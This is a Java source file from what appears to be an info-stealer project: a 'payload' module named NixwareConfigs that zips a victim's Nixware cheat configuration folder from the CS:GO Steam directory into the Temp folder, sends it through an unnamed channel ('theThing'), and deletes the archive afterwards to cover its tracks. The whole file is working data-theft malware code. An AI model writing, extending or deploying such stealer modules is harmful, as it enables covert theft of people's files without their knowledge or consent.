package dev.peter.luterium.features;

import dev.peter.luterium.Main;
import dev.peter.luterium.payload.PayloadExecutor;
import dev.peter.luterium.utils.FileUtil;
import org.zeroturnaround.zip.ZipUtil;

import java.io.File;
import java.util.Optional;

import static dev.peter.luterium.utils.FileUtil.*;

/**
 * @author Peter
 * @since 09/01/2022
 * 100% made by me!
 */

public class NixwareConfigs implements PayloadExecutor {
    Main main = new Main();

    String path = "C:\\Program Files (x86)\\Steam\\steamapps\\common\\Counter-Strike Global Offensive\\nix";
    String zipPath = System.getProperty("user.home") + "\\AppData\\Local\\Temp\\oof.zip";

    @Override
    public void execute() throws Exception {
        ZipUtil.pack(new File(path), new File(zipPath));

        Optional<File> file = FileUtil.getFile(zipPath);
        file.ifPresent(main.theThing::send);

        deleteFileAfterSent();
    }

    public void deleteFileAfterSent() {
        File zipFile = new File(zipPath);

        zipFile.delete();
    }
}
